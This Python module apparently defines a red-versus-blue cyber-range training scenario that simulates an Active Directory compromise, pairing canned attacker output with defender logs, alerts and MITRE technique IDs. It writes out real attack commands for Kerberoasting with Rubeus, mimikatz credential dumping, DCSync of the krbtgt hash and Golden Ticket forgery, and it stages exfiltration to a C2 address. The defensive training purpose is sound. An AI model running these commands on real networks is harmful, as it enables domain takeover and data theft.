"""Cyber Range — interactive red team vs blue team training scenarios.

Red team console: simulated C2-like commands generating attack actions.
Blue team panel: corresponding logs, alerts, and MITRE detections.
Trainees can play attacker, defender, or both sides simultaneously.
"""

import logging
from typing import Any

logger = logging.getLogger(__name__)

# =====================================================================
# Attack Command Registry — what the red team can "execute"
# Each command produces: red team output, blue team logs, blue team alerts
# =====================================================================

RANGE_SCENARIOS = {
    "ad-compromise": {
        "id": "ad-compromise",
        "title": "Active Directory Compromise",
        "difficulty": "advanced",
        "description": "Full kill chain: initial access via phishing, credential theft, lateral movement, domain dominance, and data exfiltration. Play as the attacker executing each stage, then switch to blue team to see what the SOC sees.",
        "estimated_minutes": 25,
        "environment": {
            "target_network": "10.20.0.0/16",
            "domain": "GUARDEDGLASS.LOCAL",
            "dc": "SRV-DC01 (10.20.1.10)",
            "file_server": "SRV-FILE01 (10.20.1.20)",
            "mail_server": "SRV-MAIL01 (10.20.1.30)",
            "workstations": ["WS-DEV03 (10.20.5.103)", "WS-FIN01 (10.20.6.10)", "WS-MKTG07 (10.20.7.55)"],
            "users": {
                "t.nguyen": {"role": "Developer", "host": "WS-DEV03", "dept": "Engineering"},
                "j.smith": {"role": "Finance Analyst", "host": "WS-FIN01", "dept": "Finance"},
                "r.chen": {"role": "Marketing Manager", "host": "WS-MKTG07", "dept": "Marketing"},
                "da_johnson": {"role": "IT Admin (Domain Admin)", "host": "SRV-JUMP01", "dept": "IT"},
            },
            "c2_server": "185.220.101.34 (Attacker C2)",
        },
        "stages": [
            {
                "id": 1,
                "name": "Initial Access",
                "tactic": "initial-access",
                "description": "Deliver a phishing email with a malicious macro document to a developer.",
                "commands": [
                    {
                        "cmd": "send-phish --target t.nguyen@guardedglass.com --template job-offer --payload macro.xlsm",
                        "description": "Send spearphishing email with malicious Excel attachment",
                        "red_output": [
                            "[*] Crafting phishing email...",
                            "[*] Template: Recruiter job offer from LinkedIn",
                            "[*] Payload: macro.xlsm (VBA macro → PowerShell download cradle)",
                            "[*] Target: t.nguyen@guardedglass.com (Developer, WS-DEV03)",
                            "[+] Email sent successfully via SMTP relay",
                            "[*] Waiting for payload execution...",
                            "",
                            "[+] CALLBACK RECEIVED from 10.20.5.103 (WS-DEV03)",
                            "[+] User t.nguyen opened macro.xlsm and enabled macros",
                            "[+] PowerShell beacon established → C2 channel active",
                        ],
                        "blue_logs": [
                            {"time": "08:23:15", "source": "Email Gateway", "level": "INFO", "msg": "Inbound email to t.nguyen@guardedglass.com from recruiter@linkedin-careers.net, attachment: Q1_Salary_Review.xlsm"},
                            {"time": "08:25:02", "source": "Endpoint/WS-DEV03", "level": "WARN", "msg": "WINWORD.EXE spawned powershell.exe (PID 4872) with -EncodedCommand flag"},
                            {"time": "08:25:03", "source": "Endpoint/WS-DEV03", "level": "WARN", "msg": "powershell.exe making outbound HTTPS connection to 185.220.101.34:443"},
                            {"time": "08:25:04", "source": "Network/Firewall", "level": "INFO", "msg": "ALLOW TCP 10.20.5.103:49721 → 185.220.101.34:443 (HTTPS)"},
                            {"time": "08:25:05", "source": "DNS", "level": "INFO", "msg": "Query: cdn-update.azureedge-cdn.com → 185.220.101.34 (suspicious: newly registered domain)"},
                        ],
                        "blue_alerts": [
                            {"title": "Suspicious Email Attachment: Macro-Enabled Document", "severity": "medium", "rule": "Email - Macro Attachment to Developer", "mitre": "T1566.001", "host": "MAIL-GW01"},
                            {"title": "Office Application Spawned PowerShell", "severity": "high", "rule": "Execution - Office Spawns Shell", "mitre": "T1059.001", "host": "WS-DEV03"},
                            {"title": "Encoded PowerShell Execution", "severity": "high", "rule": "Execution - Encoded PowerShell", "mitre": "T1059.001", "host": "WS-DEV03"},
                            {"title": "Outbound Connection to Known Tor Exit Node", "severity": "high", "rule": "C2 - Connection to Threat Intel IP", "mitre": "T1071.001", "host": "WS-DEV03"},
                        ],
                        "mitre": ["T1566.001", "T1059.001", "T1071.001"],
                        "user_view": {
                            "desktop_user": "t.nguyen",
                            "host": "WS-DEV03",
                            "events": [
                                {"type": "notification", "app": "Outlook", "icon": "mail", "title": "New Email", "detail": "From: Sarah Chen (LinkedIn Recruiter)\nSubject: Exciting Sr. Developer Opportunity — Salary Review Attached"},
                                {"type": "app_open", "app": "Microsoft Excel", "icon": "file-spreadsheet", "title": "Q1_Salary_Review.xlsm", "detail": "SECURITY WARNING: Macros have been disabled.\n[Enable Content]"},
                                {"type": "dialog", "app": "Microsoft Excel", "icon": "alert-triangle", "title": "Microsoft Excel Security Notice", "detail": "Macros have been disabled. Click 'Enable Content' to view the full document.\n\nUser clicked: Enable Content"},
                                {"type": "brief_flash", "app": "PowerShell", "icon": "terminal", "title": "", "detail": "A black command window briefly appeared and disappeared (< 1 second)"},
                                {"type": "normal", "app": "Microsoft Excel", "icon": "file-spreadsheet", "title": "Q1_Salary_Review.xlsm", "detail": "The spreadsheet appears to load normally. Contains a fake salary comparison table. User continues working — unaware that a beacon is now active."},
                            ],
                        },
                    },
                ],
            },
            {
                "id": 2,
                "name": "Discovery & Credential Access",
                "tactic": "credential-access",
                "description": "Enumerate the domain and steal credentials from the compromised workstation.",
                "commands": [
                    {
                        "cmd": "shell whoami /all && net user /domain && nltest /dclist:guardedglass.local",
                        "description": "Domain enumeration — identify users, groups, domain controllers",
                        "red_output": [
                            "[*] Executing domain enumeration on WS-DEV03...",
                            "",
                            "GUARDEDGLASS\\t.nguyen",
                            "  Groups: Domain Users, Developers, VPN-Users",
                            "",
                            "Domain Controllers:",
                            "  SRV-DC01.guardedglass.local (PDC) [10.20.1.10]",
                            "  SRV-DC02.guardedglass.local       [10.20.1.11]",
                            "",
                            "Domain Admins: da_johnson, svc_sccm, Administrator",
                            "[+] Identified 847 domain users, 2 DCs, 3 domain admin accounts",
                        ],
                        "blue_logs": [
                            {"time": "08:31:10", "source": "Endpoint/WS-DEV03", "level": "INFO", "msg": "Process: powershell.exe executed 'whoami /all' (PID 4872)"},
                            {"time": "08:31:11", "source": "DC/SRV-DC01", "level": "INFO", "msg": "LDAP query from 10.20.5.103: (&(objectClass=user)) — enumerating all domain users"},
                            {"time": "08:31:12", "source": "DC/SRV-DC01", "level": "INFO", "msg": "LDAP query from 10.20.5.103: (&(objectClass=group)(cn=Domain Admins))"},
                        ],
                        "blue_alerts": [
                            {"title": "Suspicious LDAP Enumeration from Workstation", "severity": "medium", "rule": "Discovery - Bulk LDAP Queries", "mitre": "T1087.002", "host": "WS-DEV03"},
                        ],
                        "mitre": ["T1087.002", "T1069.002", "T1018"],
                        "user_view": {
                            "desktop_user": "t.nguyen",
                            "host": "WS-DEV03",
                            "events": [
                                {"type": "normal", "app": "Desktop", "icon": "monitor", "title": "Normal Operation", "detail": "User t.nguyen is working in VS Code editing Python files. Nothing visible on screen — all enumeration happens silently in the background via the beacon process."},
                            ],
                        },
                    },
                    {
                        "cmd": "execute-assembly Rubeus.exe kerberoast /outfile:hashes.txt",
                        "description": "Kerberoast — request TGS tickets for service accounts, crack offline",
                        "red_output": [
                            "[*] Loading Rubeus.exe into memory via execute-assembly...",
                            "[*] Targeting service accounts with SPNs...",
                            "",
                            "[+] Found 23 accounts with SPNs",
                            "[+] Requesting RC4 TGS tickets...",
                            "  MSSQLSvc/SQL01.gg.local:1433     — svc_sql (RC4_HMAC)",
                            "  HTTP/intranet.gg.local            — svc_iis (RC4_HMAC)",
                            "  CIFS/SRV-FILE01.gg.local          — svc_backup (RC4_HMAC)",
                            "  MSSQLSvc/SQL02.gg.local:1433     — svc_reporting (RC4_HMAC)",
                            "  ... 19 more",
                            "",
                            "[+] 23 TGS tickets saved to hashes.txt",
                            "[*] Cracking with hashcat...",
                            "[+] svc_backup : Summer2024!  (cracked in 3 seconds)",
                            "[+] svc_sql    : SqlSvc#2023  (cracked in 47 seconds)",
                        ],
                        "blue_logs": [
                            {"time": "08:35:00", "source": "DC/SRV-DC01", "level": "WARN", "msg": "Event 4769: 23 TGS requests from 10.20.5.103 in 4 minutes (etype 0x17 RC4) — anomalous volume"},
                            {"time": "08:35:01", "source": "DC/SRV-DC01", "level": "INFO", "msg": "Event 4769: TGS request for MSSQLSvc/SQL01 from t.nguyen@GUARDEDGLASS (RC4)"},
                            {"time": "08:35:02", "source": "DC/SRV-DC01", "level": "INFO", "msg": "Event 4769: TGS request for HTTP/intranet from t.nguyen@GUARDEDGLASS (RC4)"},
                        ],
                        "blue_alerts": [
                            {"title": "Kerberoasting: Excessive TGS Requests with RC4", "severity": "high", "rule": "Credential Access - Kerberoasting", "mitre": "T1558.003", "host": "WS-DEV03"},
                            {"title": "RC4 Encryption Requested (Downgrade Attack)", "severity": "medium", "rule": "Credential Access - Kerberos RC4 Downgrade", "mitre": "T1558.003", "host": "SRV-DC01"},
                        ],
                        "mitre": ["T1558.003"],
                        "user_view": {
                            "desktop_user": "t.nguyen",
                            "host": "WS-DEV03",
                            "events": [
                                {"type": "normal", "app": "Desktop", "icon": "monitor", "title": "Normal Operation", "detail": "User still working normally. Rubeus runs entirely in memory via the beacon — no files written to disk, no visible windows. The 23 Kerberos ticket requests happen at the protocol level, invisible to the user."},
                            ],
                        },
                    },
                ],
            },
            {
                "id": 3,
                "name": "Lateral Movement",
                "tactic": "lateral-movement",
                "description": "Use stolen service account credentials to move to the file server and domain controller.",
                "commands": [
                    {
                        "cmd": "psexec svc_backup@10.20.1.20 cmd.exe",
                        "description": "Lateral movement to file server via PsExec using cracked service account",
                        "red_output": [
                            "[*] Attempting PsExec to SRV-FILE01 (10.20.1.20) as svc_backup...",
                            "[*] Connecting to ADMIN$ share...",
                            "[+] Service PSEXESVC installed on SRV-FILE01",
                            "[+] Shell established!",
                            "",
                            "C:\\Windows\\system32> hostname",
                            "SRV-FILE01",
                            "C:\\Windows\\system32> whoami",
                            "GUARDEDGLASS\\svc_backup",
                            "",
                            "[+] Pivot established: WS-DEV03 → SRV-FILE01",
                        ],
                        "blue_logs": [
                            {"time": "08:42:30", "source": "Endpoint/SRV-FILE01", "level": "WARN", "msg": "Event 7045: New service installed: PSEXESVC (\\\\SRV-FILE01\\ADMIN$\\psexesvc.exe)"},
                            {"time": "08:42:31", "source": "Endpoint/SRV-FILE01", "level": "WARN", "msg": "Event 4624: Logon Type 3 (Network) for svc_backup from 10.20.5.103"},
                            {"time": "08:42:32", "source": "Network/Firewall", "level": "INFO", "msg": "ALLOW TCP 10.20.5.103 → 10.20.1.20:445 (SMB)"},
                        ],
                        "blue_alerts": [
                            {"title": "PsExec Service Installation on Server", "severity": "high", "rule": "Lateral Movement - PsExec", "mitre": "T1569.002", "host": "SRV-FILE01"},
                            {"title": "Service Account Interactive Logon (Unusual)", "severity": "medium", "rule": "Lateral Movement - Service Account Logon", "mitre": "T1078.002", "host": "SRV-FILE01"},
                        ],
                        "mitre": ["T1569.002", "T1021.002", "T1078.002"],
                        "user_view": {
                            "desktop_user": "Backup Service",
                            "host": "SRV-FILE01",
                            "events": [
                                {"type": "notification", "app": "Windows Services", "icon": "settings", "title": "New Service Installed", "detail": "Service 'PSEXESVC' was installed and started.\n(Normally invisible — only appears in Event Viewer)"},
                                {"type": "normal", "app": "Server Desktop", "icon": "server", "title": "No Interactive User", "detail": "SRV-FILE01 is a file server with no interactive desktop sessions. The PsExec service installation and command execution happen entirely in the background. No user would see anything."},
                            ],
                        },
                    },
                    {
                        "cmd": "mimikatz sekurlsa::logonpasswords",
                        "description": "Dump credentials from file server memory — harvest domain admin tokens",
                        "red_output": [
                            "[*] Loading mimikatz on SRV-FILE01...",
                            "",
                            "mimikatz # sekurlsa::logonpasswords",
                            "",
                            "Authentication Id : 0 ; 996 (00000000:000003e4)",
                            "Session           : Service from 0",
                            "User Name         : svc_backup",
                            "Domain            : GUARDEDGLASS",
                            "NTLM              : a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
                            "",
                            "Authentication Id : 0 ; 43921847",
                            "Session           : Interactive from 2",
                            "User Name         : da_johnson",
                            "Domain            : GUARDEDGLASS",
                            "NTLM              : 9f8e7d6c5b4a39281706f5e4d3c2b1a0",
                            "",
                            "[+] DOMAIN ADMIN CREDENTIALS HARVESTED: da_johnson",
                            "[+] NTLM hash captured — can be used for pass-the-hash",
                        ],
                        "blue_logs": [
                            {"time": "08:45:10", "source": "Endpoint/SRV-FILE01", "level": "CRIT", "msg": "Process cmd.exe (PID 2104) accessed lsass.exe with PROCESS_VM_READ — credential dumping detected"},
                            {"time": "08:45:11", "source": "Endpoint/SRV-FILE01", "level": "WARN", "msg": "Suspicious module loaded: mimikatz.exe (SHA256: aabbcc...) — known credential theft tool"},
                        ],
                        "blue_alerts": [
                            {"title": "LSASS Memory Access by Non-System Process", "severity": "critical", "rule": "Credential Access - LSASS Dump", "mitre": "T1003.001", "host": "SRV-FILE01"},
                            {"title": "Known Attack Tool Detected: Mimikatz", "severity": "critical", "rule": "Execution - Known Attack Tool", "mitre": "T1003.001", "host": "SRV-FILE01"},
                        ],
                        "mitre": ["T1003.001"],
                        "user_view": {
                            "desktop_user": "Backup Service",
                            "host": "SRV-FILE01",
                            "events": [
                                {"type": "normal", "app": "Server Desktop", "icon": "server", "title": "No Visible Activity", "detail": "Mimikatz runs in memory via the PsExec session. It reads LSASS process memory to extract cached credentials. There are no visible windows, no prompts, no CPU spike noticeable by any logged-in admin."},
                                {"type": "info", "app": "Key Insight", "icon": "info", "title": "Why This Is Dangerous", "detail": "da_johnson (Domain Admin) previously RDP'd into this server for maintenance. Their credentials are still cached in LSASS memory — even though they logged off hours ago. This is why admin credential hygiene and tiered access (PAW) matter."},
                            ],
                        },
                    },
                ],
            },
            {
                "id": 4,
                "name": "Domain Dominance",
                "tactic": "persistence",
                "description": "Use domain admin credentials to perform DCSync and create a Golden Ticket for persistent access.",
                "commands": [
                    {
                        "cmd": "dcsync guardedglass.local /user:krbtgt",
                        "description": "DCSync — extract KRBTGT hash to forge Golden Tickets",
                        "red_output": [
                            "[*] Performing DCSync against SRV-DC01 as da_johnson...",
                            "[*] Requesting replication of krbtgt account...",
                            "",
                            "Object RDN           : krbtgt",
                            "SAM Username          : krbtgt",
                            "User Principal Name   : krbtgt@guardedglass.local",
                            "Object Security ID    : S-1-5-21-...-502",
                            "",
                            "Hash NTLM: e4f7c5b3a29187d6c0e4f7c5b3a29187",
                            "",
                            "[+] KRBTGT HASH EXTRACTED",
                            "[+] Can now forge Golden Tickets for ANY user",
                            "[+] Domain is fully compromised",
                        ],
                        "blue_logs": [
                            {"time": "08:50:00", "source": "DC/SRV-DC01", "level": "CRIT", "msg": "Event 4662: DS-Replication-Get-Changes-All requested by da_johnson from 10.20.1.20 (NOT a Domain Controller)"},
                            {"time": "08:50:01", "source": "DC/SRV-DC01", "level": "CRIT", "msg": "DRS GetNCChanges request for DC=guardedglass,DC=local from non-DC host SRV-FILE01"},
                        ],
                        "blue_alerts": [
                            {"title": "DCSync: Domain Replication from Non-DC Host", "severity": "critical", "rule": "Credential Access - DCSync", "mitre": "T1003.006", "host": "SRV-DC01"},
                            {"title": "Replicating Directory Changes All — Suspicious Source", "severity": "critical", "rule": "Persistence - KRBTGT Extraction", "mitre": "T1003.006", "host": "SRV-DC01"},
                        ],
                        "mitre": ["T1003.006"],
                        "user_view": {
                            "desktop_user": "da_johnson",
                            "host": "SRV-JUMP01",
                            "events": [
                                {"type": "normal", "app": "Server Desktop", "icon": "server", "title": "No Visible Activity", "detail": "DCSync uses the standard Active Directory replication protocol. From the network's perspective, it looks like normal DC-to-DC replication traffic. No visible windows or prompts on any machine."},
                                {"type": "info", "app": "Key Insight", "icon": "info", "title": "The Silent Domain Theft", "detail": "The attacker just downloaded EVERY password hash in Active Directory — all 847 user accounts, all service accounts, the KRBTGT key. This all happened via a single network request that looks like normal AD replication. No alarms on any desktop."},
                            ],
                        },
                    },
                    {
                        "cmd": "golden_ticket /domain:guardedglass.local /sid:S-1-5-21-... /krbtgt:e4f7c5b3a29187d6c0e4f7c5b3a29187 /user:Administrator /ptt",
                        "description": "Forge a Golden Ticket for the Administrator account with 10-year lifetime",
                        "red_output": [
                            "[*] Forging Golden Ticket...",
                            "  Domain      : guardedglass.local",
                            "  SID         : S-1-5-21-...",
                            "  User        : Administrator",
                            "  KRBTGT NTLM : e4f7c5b3a29187d6c0e4f7c5b3a29187",
                            "  Lifetime    : 10 years",
                            "",
                            "[+] Golden Ticket created and injected into current session",
                            "[+] Now operating as: GUARDEDGLASS\\Administrator",
                            "[+] PERSISTENCE ESTABLISHED — this ticket survives password resets",
                        ],
                        "blue_logs": [
                            {"time": "08:52:00", "source": "DC/SRV-DC01", "level": "WARN", "msg": "Event 4769: TGS request from SRV-FILE01 for CIFS/SRV-DC01 — NO corresponding AS-REQ in last 48h"},
                            {"time": "08:52:01", "source": "DC/SRV-DC01", "level": "CRIT", "msg": "Anomalous TGT detected: lifetime 87600 hours (default: 10h), issuer: UNKNOWN"},
                        ],
                        "blue_alerts": [
                            {"title": "Golden Ticket: TGS Without Prior Authentication", "severity": "critical", "rule": "Persistence - Golden Ticket", "mitre": "T1558.001", "host": "SRV-DC01"},
                        ],
                        "mitre": ["T1558.001"],
                        "user_view": {
                            "desktop_user": "da_johnson",
                            "host": "SRV-JUMP01",
                            "events": [
                                {"type": "normal", "app": "Server Desktop", "icon": "server", "title": "Completely Invisible", "detail": "A Golden Ticket is forged entirely in the attacker's memory. No files, no network traffic to create it. Once injected, the attacker appears to be a legitimate Domain Admin to every system in the network."},
                                {"type": "warning", "app": "Key Insight", "icon": "alert-triangle", "title": "Persistence Achieved", "detail": "The attacker now has a ticket valid for 10 YEARS. Even if da_johnson's password is reset, the Golden Ticket still works. Only resetting the KRBTGT password TWICE will invalidate it. Most organizations never do this."},
                            ],
                        },
                    },
                ],
            },
            {
                "id": 5,
                "name": "Exfiltration",
                "tactic": "exfiltration",
                "description": "Access sensitive file shares and exfiltrate data via encrypted C2 channel.",
                "commands": [
                    {
                        "cmd": "ls \\\\SRV-FILE01\\Finance$ && download \\\\SRV-FILE01\\Finance$\\Q1-2026-Results.xlsx",
                        "description": "Access restricted finance share and exfiltrate sensitive documents",
                        "red_output": [
                            "[*] Accessing \\\\SRV-FILE01\\Finance$ as Administrator...",
                            "",
                            " Directory of \\\\SRV-FILE01\\Finance$",
                            "",
                            " 04/01/2026  09:14    <DIR>    Payroll",
                            " 04/03/2026  16:22    <DIR>    Board-Reports",
                            " 04/05/2026  11:30    4,521,088    Q1-2026-Results.xlsx",
                            " 04/05/2026  14:18    2,847,744    M&A-Draft-Confidential.docx",
                            " 04/06/2026  08:44    1,203,456    Employee-Salary-Database.csv",
                            "",
                            "[*] Downloading Q1-2026-Results.xlsx (4.3MB)...",
                            "[*] Downloading M&A-Draft-Confidential.docx (2.7MB)...",
                            "[*] Downloading Employee-Salary-Database.csv (1.1MB)...",
                            "[+] 3 files exfiltrated via HTTPS C2 channel (8.1MB total)",
                            "",
                            "[+] OBJECTIVE COMPLETE: Sensitive financial data exfiltrated",
                        ],
                        "blue_logs": [
                            {"time": "08:55:00", "source": "Network/Firewall", "level": "INFO", "msg": "Large outbound transfer: 10.20.1.20 → 185.220.101.34:443, 8.3MB in 12 seconds"},
                            {"time": "08:55:01", "source": "Endpoint/SRV-FILE01", "level": "WARN", "msg": "Event 5145: Share access \\\\SRV-FILE01\\Finance$ by GUARDEDGLASS\\Administrator from SRV-FILE01 (unusual — admin doesn't normally access Finance$)"},
                            {"time": "08:55:02", "source": "DLP", "level": "CRIT", "msg": "Sensitive file access pattern: 3 files containing PII/financial data accessed in rapid succession"},
                        ],
                        "blue_alerts": [
                            {"title": "Unusual Admin Access to Restricted File Share", "severity": "high", "rule": "Collection - Sensitive Share Access", "mitre": "T1039", "host": "SRV-FILE01"},
                            {"title": "Large Outbound Data Transfer to External IP", "severity": "high", "rule": "Exfiltration - Large Transfer", "mitre": "T1041", "host": "SRV-FILE01"},
                            {"title": "Data Loss Prevention: Bulk PII/Financial File Access", "severity": "critical", "rule": "Exfiltration - DLP Trigger", "mitre": "T1005", "host": "SRV-FILE01"},
                        ],
                        "mitre": ["T1039", "T1041", "T1005"],
                        "user_view": {
                            "desktop_user": "j.smith",
                            "host": "WS-FIN01",
                            "events": [
                                {"type": "normal", "app": "Desktop", "icon": "monitor", "title": "Finance Team Unaware", "detail": "j.smith in Finance is working normally at WS-FIN01. They have no idea that the Finance$ share on SRV-FILE01 is being accessed remotely. The files are being read and exfiltrated — not modified or deleted — so no file-in-use warnings appear."},
                                {"type": "notification", "app": "Windows Explorer", "icon": "folder", "title": "No File Locks Visible", "detail": "The attacker is using Administrator credentials to read files via SMB. From j.smith's perspective, the shared drive works normally. Opened files show no conflicts."},
                                {"type": "warning", "app": "Key Insight", "icon": "alert-triangle", "title": "The Invisible Theft", "detail": "8.1MB of confidential financial data — quarterly results, M&A drafts, employee salary database — just left the network via the attacker's encrypted C2 channel. No pop-ups, no warnings, no download dialogs. The DLP system caught it, but would anyone be watching in real-time?"},
                            ],
                        },
                    },
                ],
            },
        ],
    },
}


def get_range_scenarios() -> list[dict]:
    """Return list of available range scenarios (without full command data)."""
    return [
        {
            "id": s["id"],
            "title": s["title"],
            "difficulty": s["difficulty"],
            "description": s["description"],
            "estimated_minutes": s["estimated_minutes"],
            "stage_count": len(s["stages"]),
            "total_commands": sum(len(st["commands"]) for st in s["stages"]),
        }
        for s in RANGE_SCENARIOS.values()
    ]


def get_range_scenario(scenario_id: str) -> dict | None:
    return RANGE_SCENARIOS.get(scenario_id)
